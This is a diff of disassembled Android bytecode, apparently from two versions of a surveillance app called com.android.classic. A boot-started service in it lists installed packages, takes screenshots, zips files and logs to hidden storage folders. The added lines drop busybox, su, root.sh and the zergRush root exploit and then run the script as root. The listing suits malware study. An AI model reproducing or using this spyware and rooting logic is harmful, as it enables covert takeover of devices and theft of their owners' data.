+        + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
+      [1680] bipush 18
+      [1682] aaload
+      [1683] invokevirtual #204
+        + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
+      [1686] ifeq +49 (target=1735)
+      [1689] ldc #3
+        + Integer [2131034112]
+      [1691] ldc #34
+        + String [busybox]
+      [1693] aload_0 v0
+      [1694] invokestatic #183
+        + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
+      [1697] ldc #4
+        + Integer [2131034113]
+      [1699] ldc #50
+        + String [makespace]
+      [1701] aload_0 v0
+      [1702] invokestatic #183
+        + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
+      [1705] ldc #5
+        + Integer [2131034114]
+      [1707] ldc #67
+        + String [root.sh]
+      [1709] aload_0 v0
+      [1710] invokestatic #183
+        + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
+      [1713] ldc #6
+        + Integer [2131034115]
+      [1715] ldc #71
+        + String [su]
+      [1717] aload_0 v0
+      [1718] invokestatic #183
+        + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
+      [1721] ldc #7
+        + Integer [2131034116]
+      [1723] ldc #75
+        + String [zergRush]
+      [1725] aload_0 v0
+      [1726] invokestatic #183
+        + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
+      [1729] ldc #12
+        + String [./data/data/com.android.classic/files/root.sh]
+      [1731] invokestatic #188
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [1734] pop
+      [1735] ldc2_w #127
+        + Long [5000]
+      [1738] invokestatic #214
+        + Methodref [java/lang/Thread.sleep (J)V]
+      [1741] aload_0 v0
+      [1742] invokevirtual #172
+        + Methodref [com/android/classic/DEBUG.finish ()V]
+      [1745] goto +34 (target=1779)
+      [1748] astore v5
+      [1750] new #122
+        + Class [java/lang/StringBuilder]
+      [1753] dup
+      [1754] ldc #47
+        + String [echo 'CODELIST | ]
+      [1756] invokespecial #210
+        + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
+      [1759] aload v5
+      [1761] invokevirtual #201
+        + Methodref [java/lang/Exception.toString ()Ljava/lang/String;]
+      [1764] invokevirtual #212
+        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
+      [1767] ldc #11
+        + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
+      [1769] invokevirtual #212
+        + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
+      [1772] invokevirtual #213
+        + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
+      [1775] invokestatic #188
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+      [1778] pop
+      [1779] return
       Code attribute exceptions (count = 4):
       - ExceptionInfo (618 -> 625: 628):
       + Class [java/io/IOException]
@@ -37689,10 +37762,10 @@ Methods (count = 6):
       + Class [java/lang/Exception]
       - ExceptionInfo (889 -> 971: 974):
       + Class [java/lang/Exception]
-      - ExceptionInfo (140 -> 1680: 1683):
+      - ExceptionInfo (140 -> 1745: 1748):
       + Class [java/lang/Exception]
       Code attribute attributes (attribute count = 1):
-      + Stack map table attribute (count = 40):
+      + Stack map table attribute (count = 41):
         - [140] Var: ...[a:android/os/StrictMode$ThreadPolicy][a:java/text/SimpleDateFormat][a:java/lang/String], Stack: (empty)
         - [173] Var: ..., Stack: (empty)
         - [206] Var: ..., Stack: (empty)
@@ -37730,9 +37803,10 @@ Methods (count = 6):
         - [1590] Var: ..., Stack: (empty)
         - [1622] Var: -2, Stack: (empty)
         - [1648] Var: ..., Stack: (empty)
-        - [1670] Var: ..., Stack: (empty)
-        - [1683] Var: ..., Stack: [a:java/lang/Exception]
-        - [1714] Var: ..., Stack: (empty)
+        - [1673] Var: ..., Stack: (empty)
+        - [1735] Var: ..., Stack: (empty)
+        - [1748] Var: ..., Stack: [a:java/lang/Exception]
+        - [1779] Var: ..., Stack: (empty)
     + Runtime invisible annotations attribute:
       - Annotation [Landroid/annotation/SuppressLint;]:
         - Array element value [value]:
@@ -37743,25 +37817,25 @@ Methods (count = 6):
       = public void a()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 155, locals = 8, stack = 4):
-      [0] ldc #52
+      [0] ldc #60
         + String [pm list packages]
-      [2] invokestatic #175
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [2] invokestatic #188
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [5] astore_1 v1
       [6] aload_1 v1
-      [7] invokeinterface #213
+      [7] invokeinterface #226
         + InterfaceMethodref [java/util/List.size ()I]
-      [12] anewarray #109
+      [12] anewarray #121
         + Class [java/lang/String]
       [15] astore_2 v2
       [16] aload_1 v1
       [17] aload_2 v2
-      [18] invokeinterface #214
+      [18] invokeinterface #227
         + InterfaceMethodref [java/util/List.toArray ([Ljava/lang/Object;)[Ljava/lang/Object;]
-      [23] checkcast #67
+      [23] checkcast #78
         + Class [[Ljava/lang/String;]
       [26] astore_2 v2
-      [27] ldc #4
+      [27] ldc #9
         + String []
       [29] astore_3 v3
       [30] aload_2 v2
@@ -37776,30 +37850,30 @@ Methods (count = 6):
       [45] iload v5
       [47] aaload
       [48] astore v4
-      [50] new #110
+      [50] new #122
         + Class [java/lang/StringBuilder]
       [53] dup
       [54] aload_3 v3
-      [55] invokestatic #195
+      [55] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [58] invokespecial #197
+      [58] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [61] aload v4
-      [63] ldc #49
+      [63] ldc #57
         + String [package:]
-      [65] ldc #4
+      [65] ldc #9
         + String []
-      [67] invokevirtual #193
+      [67] invokevirtual #206
         + Methodref [java/lang/String.replace (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;]
-      [70] invokevirtual #194
+      [70] invokevirtual #207
         + Methodref [java/lang/String.toString ()Ljava/lang/String;]
-      [73] invokevirtual #199
+      [73] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [76] ldc #66
+      [76] ldc #77
         + String [||]
-      [78] invokevirtual #199
+      [78] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [81] invokevirtual #200
+      [81] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [84] astore_3 v3
       [85] iinc v5, 1
@@ -37807,11 +37881,11 @@ Methods (count = 6):
       [90] iload v6
       [92] ificmplt -49 (target=43)
       [95] iconst_2
-      [96] anewarray #109
+      [96] anewarray #121
         + Class [java/lang/String]
       [99] dup
       [100] iconst_0
-      [101] ldc #50
+      [101] ldc #58
         + String [packages]
       [103] aastore
       [104] dup
@@ -37819,36 +37893,36 @@ Methods (count = 6):
       [106] aload_3 v3
       [107] aastore
       [108] astore v4
-      [110] new #97
-        + Class [com/android/classic/helper/g]
+      [110] new #109
+        + Class [com/android/classic/helper/h]
       [113] dup
-      [114] invokespecial #171
-        + Methodref [com/android/classic/helper/g.<init> ()V]
+      [114] invokespecial #184
+        + Methodref [com/android/classic/helper/h.<init> ()V]
       [117] aload v4
-      [119] invokevirtual #172
-        + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [119] invokevirtual #185
+        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [122] pop
-      [123] getstatic #128
+      [123] getstatic #140
         + Fieldref [com/android/classic/helper/d.a Z]
       [126] ifeq +28 (target=154)
-      [129] new #110
+      [129] new #122
         + Class [java/lang/StringBuilder]
       [132] dup
-      [133] ldc #39
+      [133] ldc #46
         + String [echo ']
-      [135] invokespecial #197
+      [135] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [138] aload_3 v3
-      [139] invokevirtual #199
+      [139] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [142] ldc #5
+      [142] ldc #10
         + String [' > /sdcard/Android/data/settings/Logger/Packages.txt]
-      [144] invokevirtual #199
+      [144] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [147] invokevirtual #200
+      [147] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [150] invokestatic #175
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+      [150] invokestatic #188
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [153] pop
       [154] return
       Code attribute exceptions (count = 0):
@@ -37862,170 +37936,170 @@ Methods (count = 6):
       = public void b()
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 223, locals = 5, stack = 6):
-      [0] new #112
+      [0] new #124
         + Class [java/text/SimpleDateFormat]
       [3] dup
-      [4] ldc #64
+      [4] ldc #74
         + String [yyyy-MM-dd_HH-mm-ss]
-      [6] invokespecial #202
+      [6] invokespecial #215
         + Methodref [java/text/SimpleDateFormat.<init> (Ljava/lang/String;)V]
       [9] astore_1 v1
       [10] aload_1 v1
-      [11] new #113
+      [11] new #125
         + Class [java/util/Date]
       [14] dup
-      [15] invokespecial #204
+      [15] invokespecial #217
         + Methodref [java/util/Date.<init> ()V]
-      [18] invokevirtual #203
+      [18] invokevirtual #216
         + Methodref [java/text/SimpleDateFormat.format (Ljava/util/Date;)Ljava/lang/String;]
       [21] astore_2 v2
-      [22] new #110
+      [22] new #122
         + Class [java/lang/StringBuilder]
       [25] dup
-      [26] invokespecial #196
+      [26] invokespecial #209
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [29] invokestatic #150
+      [29] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [32] invokevirtual #198
+      [32] invokevirtual #211
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
-      [35] ldc #13
+      [35] ldc #19
         + String [/Android/data/settings/Screenshots/]
-      [37] invokevirtual #199
+      [37] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [40] getstatic #117
+      [40] getstatic #129
         + Fieldref [android/os/Build.MODEL Ljava/lang/String;]
-      [43] invokevirtual #199
+      [43] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [46] ldc #18
+      [46] ldc #24
         + String [_Screenshot_]
-      [48] invokevirtual #199
+      [48] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [51] aload_2 v2
-      [52] invokevirtual #199
+      [52] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [55] invokevirtual #200
+      [55] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [58] astore_3 v3
-      [59] getstatic #118
+      [59] getstatic #130
         + Fieldref [android/os/Build$VERSION.SDK_INT I]
       [62] bipush 11
       [64] ificmpge +99 (target=163)
-      [67] new #110
+      [67] new #122
         + Class [java/lang/StringBuilder]
       [70] dup
       [71] aload_3 v3
-      [72] invokestatic #195
+      [72] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [75] invokespecial #197
+      [75] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [78] ldc #7
+      [78] ldc #13
         + String [.bmp]
-      [80] invokevirtual #199
+      [80] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [83] invokevirtual #200
+      [83] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [86] astore_3 v3
       [87] iconst_3
-      [88] anewarray #109
+      [88] anewarray #121
         + Class [java/lang/String]
       [91] dup
       [92] iconst_0
-      [93] ldc #60
+      [93] ldc #69
         + String [screenshot]
       [95] aastore
       [96] dup
       [97] iconst_1
-      [98] new #110
+      [98] new #122
         + Class [java/lang/StringBuilder]
       [101] dup
-      [102] ldc #29
+      [102] ldc #36
         + String [cat ]
-      [104] invokespecial #197
+      [104] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [107] invokestatic #150
+      [107] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [110] invokevirtual #198
+      [110] invokevirtual #211
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
-      [113] ldc #16
+      [113] ldc #22
         + String [/tmpshot.bmp > ]
-      [115] invokevirtual #199
+      [115] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [118] aload_3 v3
-      [119] invokevirtual #199
+      [119] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [122] invokevirtual #200
+      [122] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [125] aastore
       [126] dup
       [127] iconst_2
-      [128] new #110
+      [128] new #122
         + Class [java/lang/StringBuilder]
       [131] dup
-      [132] ldc #57
+      [132] ldc #65
         + String [rm -rf ]
-      [134] invokespecial #197
+      [134] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [137] invokestatic #150
+      [137] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [140] invokevirtual #198
+      [140] invokevirtual #211
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
-      [143] ldc #15
+      [143] ldc #21
         + String [/tmpshot.bmp]
-      [145] invokevirtual #199
+      [145] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [148] invokevirtual #200
+      [148] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [151] aastore
       [152] astore v4
       [154] aload v4
-      [156] invokestatic #178
-        + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
+      [156] invokestatic #191
+        + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
       [159] pop
       [160] goto +43 (target=203)
-      [163] new #110
+      [163] new #122
         + Class [java/lang/StringBuilder]
       [166] dup
       [167] aload_3 v3
-      [168] invokestatic #195
+      [168] invokestatic #208
         + Methodref [java/lang/String.valueOf (Ljava/lang/Object;)Ljava/lang/String;]
-      [171] invokespecial #197
+      [171] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
-      [174] ldc #8
+      [174] ldc #14
         + String [.png]
-      [176] invokevirtual #199
+      [176] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [179] invokevirtual #200
+      [179] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
       [182] astore_3 v3
-      [183] new #110
+      [183] new #122
         + Class [java/lang/StringBuilder]
       [186] dup
-      [187] ldc #59
+      [187] ldc #68
         + String [screencap -p ]
-      [189] invokespecial #197
+      [189] invokespecial #210
         + Methodref [java/lang/StringBuilder.<init> (Ljava/lang/String;)V]
       [192] aload_3 v3
-      [193] invokevirtual #199
+      [193] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [196] invokevirtual #200
+      [196] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [199] invokestatic #177
-        + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
+      [199] invokestatic #190
+        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
       [202] pop
-      [203] new #98
-        + Class [com/android/classic/helper/h]
+      [203] new #110
+        + Class [com/android/classic/helper/i]
       [206] dup
-      [207] invokespecial #173
-        + Methodref [com/android/classic/helper/h.<init> ()V]
+      [207] invokespecial #186
+        + Methodref [com/android/classic/helper/i.<init> ()V]
       [210] iconst_1
-      [211] anewarray #109
+      [211] anewarray #121
         + Class [java/lang/String]
       [214] dup
       [215] iconst_0
       [216] aload_3 v3
       [217] aastore
-      [218] invokevirtual #174
-        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+      [218] invokevirtual #187
+        + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [221] pop
       [222] return
       Code attribute exceptions (count = 0):
@@ -38039,18 +38113,18 @@ Methods (count = 6):
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 20, locals = 3, stack = 3):
       [0] aload_1 v1
-      [1] invokevirtual #141
+      [1] invokevirtual #153
         + Methodref [android/content/Intent.getExtras ()Landroid/os/Bundle;]
       [4] astore_2 v2
       [5] aload_2 v2
       [6] ifnull +13 (target=19)
       [9] aload_0 v0
       [10] aload_2 v2
-      [11] ldc #33
+      [11] ldc #40
         + String [command]
-      [13] invokevirtual #149
+      [13] invokevirtual #161
         + Methodref [android/os/Bundle.getString (Ljava/lang/String;)Ljava/lang/String;]
-      [16] putfield #126
+      [16] putfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
       [19] return
       Code attribute exceptions (count = 0):
@@ -38066,7 +38140,7 @@ Methods (count = 6):
       [1] iload_1 v1
       [2] iload_2 v2
       [3] aload_3 v3
-      [4] invokespecial #130
+      [4] invokespecial #142
         + Methodref [android/app/Activity.onActivityResult (IILandroid/content/Intent;)V]
       [7] return
       Code attribute exceptions (count = 0):
@@ -38136,7 +38210,7 @@ Constant Pool (count = 57):
   + Class [android/content/ComponentName]
   + Class [android/content/Intent]
   + Class [com/android/classic/DUMMY]
-  + Class [eu/chainfire/libsuperuser/d]
+  + Class [eu/chainfire/libsuperuser/c]
   + Class [java/lang/Exception]
   + Methodref [android/app/Activity.<init> ()V]
   + Methodref [android/app/Activity.onCreate (Landroid/os/Bundle;)V]
@@ -38146,8 +38220,8 @@ Constant Pool (count = 57):
   + Methodref [android/content/Intent.setComponent (Landroid/content/ComponentName;)Landroid/content/Intent;]
   + Methodref [com/android/classic/DUMMY.finish ()V]
   + Methodref [com/android/classic/DUMMY.startActivity (Landroid/content/Intent;)V]
-  + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
-  + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
+  + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
   + NameAndType [<init> ()V]
   + NameAndType [<init> (Ljava/lang/String;Ljava/lang/String;)V]
   + NameAndType [a ()Z]
@@ -38176,7 +38250,7 @@ Constant Pool (count = 57):
   + Utf8 [com.android.settings]
   + Utf8 [com.android.settings.LanguageSettings]
   + Utf8 [com/android/classic/DUMMY]
-  + Utf8 [eu/chainfire/libsuperuser/d]
+  + Utf8 [eu/chainfire/libsuperuser/c]
   + Utf8 [finish]
   + Utf8 [id]
   + Utf8 [java/lang/Exception]
@@ -38209,12 +38283,12 @@ Methods (count = 2):
       [2] invokespecial #12
         + Methodref [android/app/Activity.onCreate (Landroid/os/Bundle;)V]
       [5] invokestatic #19
-        + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
+        + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
       [8] ifeq +9 (target=17)
       [11] ldc #4
         + String [id]
       [13] invokestatic #20
-        + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
       [16] pop
       [17] new #7
         + Class [android/content/Intent]
@@ -38285,7 +38359,7 @@ Constant Pool (count = 61):
   + Class [com/android/classic/helper/BootUpReceiver]
   + Class [com/android/classic/helper/DEBUGSERVICE]
   + Class [com/android/classic/helper/d]
-  + Class [eu/chainfire/libsuperuser/c]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [java/lang/System]
   + Long [300000]
   + Fieldref [com/android/classic/helper/d.a Z]
@@ -38294,7 +38368,7 @@ Constant Pool (count = 61):
   + Methodref [android/content/BroadcastReceiver.<init> ()V]
   + Methodref [android/content/Context.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
   + Methodref [android/content/Intent.<init> (Landroid/content/Context;Ljava/lang/Class;)V]
-  + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/lang/System.currentTimeMillis ()J]
   + NameAndType [<init> ()V]
   + NameAndType [<init> (Landroid/content/Context;Ljava/lang/Class;)V]
@@ -38328,7 +38402,7 @@ Constant Pool (count = 61):
   + Utf8 [com/android/classic/helper/d]
   + Utf8 [currentTimeMillis]
   + Utf8 [echo 'booted up' > /sdcard/Android/data/settings/Logger/bootup.txt]
-  + Utf8 [eu/chainfire/libsuperuser/c]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [getService]
   + Utf8 [getSystemService]
   + Utf8 [java/lang/System]
@@ -38393,7 +38467,7 @@ Methods (count = 2):
       [51] ldc #2
         + String [echo 'booted up' > /sdcard/Android/data/settings/Logger/bootup.txt]
       [53] invokestatic #21
-        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
       [56] pop
       [57] return
       Code attribute exceptions (count = 0):
@@ -38619,8 +38693,8 @@ Constant Pool (count = 44):
   + Class [[Ljava/lang/String;]
   + Class [android/os/AsyncTask]
   + Class [com/android/classic/helper/b]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [eu/chainfire/libsuperuser/c]
-  + Class [eu/chainfire/libsuperuser/d]
   + Class [java/lang/String]
   + Class [java/lang/Void]
   + Methodref [android/os/AsyncTask.<init> ()V]
@@ -38628,9 +38702,9 @@ Constant Pool (count = 44):
   + Methodref [android/os/AsyncTask.onPreExecute ()V]
   + Methodref [com/android/classic/helper/b.a (Ljava/lang/Void;)V]
   + Methodref [com/android/classic/helper/b.a ([Ljava/lang/String;)Ljava/lang/Void;]
+  + Methodref [eu/chainfire/libsuperuser/b.a ([Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
   + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
-  + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
   + NameAndType [<init> ()V]
   + NameAndType [a ()Z]
   + NameAndType [a (Ljava/lang/Void;)V]
@@ -38653,8 +38727,8 @@ Constant Pool (count = 44):
   + Utf8 [android/os/AsyncTask]
   + Utf8 [com/android/classic/helper/b]
   + Utf8 [doInBackground]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [eu/chainfire/libsuperuser/c]
-  + Utf8 [eu/chainfire/libsuperuser/d]
   + Utf8 [java/lang/String]
   + Utf8 [java/lang/Void]
   + Utf8 [onPostExecute]
@@ -38714,16 +38788,16 @@ Methods (count = 6):
       [26] isub
       [27] ificmplt -16 (target=11)
       [30] invokestatic #14
-        + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
+        + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
       [33] ifeq +11 (target=44)
       [36] aload_2 v2
       [37] invokestatic #15
-        + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
       [40] pop
       [41] goto +8 (target=49)
       [44] aload_2 v2
       [45] invokestatic #13
-        + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
+        + Methodref [eu/chainfire/libsuperuser/b.a ([Ljava/lang/String;)Ljava/util/List;]
       [48] pop
       [49] aconst_null
       [50] areturn
@@ -38791,7 +38865,7 @@ Constant Pool (count = 87):
   + Class [[B]
   + Class [[Ljava/io/File;]
   + Class [com/android/classic/helper/c]
-  + Class [com/android/classic/helper/h]
+  + Class [com/android/classic/helper/i]
   + Class [java/io/File]
   + Class [java/io/FileInputStream]
   + Class [java/io/FileOutputStream]
@@ -38800,8 +38874,8 @@ Constant Pool (count = 87):
   + Class [java/util/zip/ZipEntry]
   + Class [java/util/zip/ZipOutputStream]
   + Methodref [com/android/classic/helper/c.a (Ljava/io/File;Ljava/io/File;Ljava/util/zip/ZipOutputStream;)V]
-  + Methodref [com/android/classic/helper/h.<init> ()V]
-  + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [com/android/classic/helper/i.<init> ()V]
+  + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
   + Methodref [java/io/File.getAbsolutePath ()Ljava/lang/String;]
   + Methodref [java/io/File.getPath ()Ljava/lang/String;]
   + Methodref [java/io/File.isDirectory ()Z]
@@ -38856,7 +38930,7 @@ Constant Pool (count = 87):
   + Utf8 [a]
   + Utf8 [close]
   + Utf8 [com/android/classic/helper/c]
-  + Utf8 [com/android/classic/helper/h]
+  + Utf8 [com/android/classic/helper/i]
   + Utf8 [execute]
   + Utf8 [getAbsolutePath]
   + Utf8 [getPath]
@@ -38904,10 +38978,10 @@ Methods (count = 2):
       [23] invokevirtual #27
         + Methodref [java/util/zip/ZipOutputStream.close ()V]
       [26] new #4
-        + Class [com/android/classic/helper/h]
+        + Class [com/android/classic/helper/i]
       [29] dup
       [30] invokespecial #13
-        + Methodref [com/android/classic/helper/h.<init> ()V]
+        + Methodref [com/android/classic/helper/i.<init> ()V]
       [33] iconst_1
       [34] anewarray #9
         + Class [java/lang/String]
@@ -38918,7 +38992,7 @@ Methods (count = 2):
         + Methodref [java/io/File.getAbsolutePath ()Ljava/lang/String;]
       [43] aastore
       [44] invokevirtual #14
-        + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+        + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [47] pop
       [48] return
       Code attribute exceptions (count = 0):
@@ -39101,7 +39175,7 @@ _____________________________________________________________________
 
 Interfaces (count = 0):
 
-Constant Pool (count = 289):
+Constant Pool (count = 299):
   + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
   + String [/Android/data/]
   + String [/Android/data/settings/]
@@ -39142,6 +39216,7 @@ Constant Pool (count = 289):
   + String [packages]
   + String [pictureBack]
   + String [pictureFront]
+  + String [root]
   + String [screen_state]
   + String [screenshot]
   + String [sendall]
@@ -39150,16 +39225,16 @@ Constant Pool (count = 289):
   + Class [android/content/IntentFilter]
   + Class [android/net/ConnectivityManager]
   + Class [android/net/NetworkInfo]
+  + Class [android/os/Build$VERSION]
   + Class [android/os/Environment]
   + Class [android/os/StrictMode]
-  + Class [android/os/StrictMode$ThreadPolicy]
   + Class [android/os/StrictMode$ThreadPolicy$Builder]
   + Class [com/android/classic/helper/DEBUGSERVICE]
   + Class [com/android/classic/helper/ScreenReceiver]
   + Class [com/android/classic/helper/a]
   + Class [com/android/classic/helper/d]
   + Class [com/android/classic/helper/e]
-  + Class [eu/chainfire/libsuperuser/c]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [java/io/BufferedReader]
   + Class [java/io/File]
   + Class [java/io/IOException]
@@ -39173,6 +39248,7 @@ Constant Pool (count = 289):
   + Class [java/lang/Void]
   + Class [org/apache/http/HttpEntity]
   + Long [300]
+  + Fieldref [android/os/Build$VERSION.SDK_INT I]
   + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
   + Fieldref [com/android/classic/helper/d.a Z]
   + Methodref [android/app/Service.<init> ()V]
@@ -39195,13 +39271,14 @@ Constant Pool (count = 289):
   + Methodref [com/android/classic/helper/DEBUGSERVICE.f ()V]
   + Methodref [com/android/classic/helper/DEBUGSERVICE.g ()V]
   + Methodref [com/android/classic/helper/DEBUGSERVICE.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
+  + Methodref [com/android/classic/helper/DEBUGSERVICE.h ()V]
   + Methodref [com/android/classic/helper/DEBUGSERVICE.registerReceiver (Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;]
   + Methodref [com/android/classic/helper/ScreenReceiver.<init> ()V]
   + Methodref [com/android/classic/helper/a.<init> ()V]
   + Methodref [com/android/classic/helper/a.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
